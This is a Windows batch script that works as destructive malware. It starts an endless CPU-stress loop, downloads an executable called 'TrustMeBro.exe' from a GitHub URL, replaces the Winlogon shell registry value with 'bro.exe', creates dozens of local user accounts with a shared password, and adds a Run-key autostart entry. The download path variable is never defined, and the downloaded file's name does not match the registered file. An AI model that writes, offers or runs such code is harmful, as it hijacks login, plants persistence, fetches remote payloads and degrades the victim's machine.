@echo off
setlocal enabledelayedexpansion
start "CPU Stress" cmd /k "powershell -command \"while ($true) { [Math]::Sqrt(12345) }\""
start "" cmd /k curl -L -o "%TARGET%" "https://raw.githubusercontent.com/xqrto/Apps/main/TrustMeBro.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Users\%username%\AppData\Roaming\bro.exe" /f
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
/v bro ^
/t REG_SZ ^
/d "%APPDATA%\bro.exe" ^
/f
powershell wininit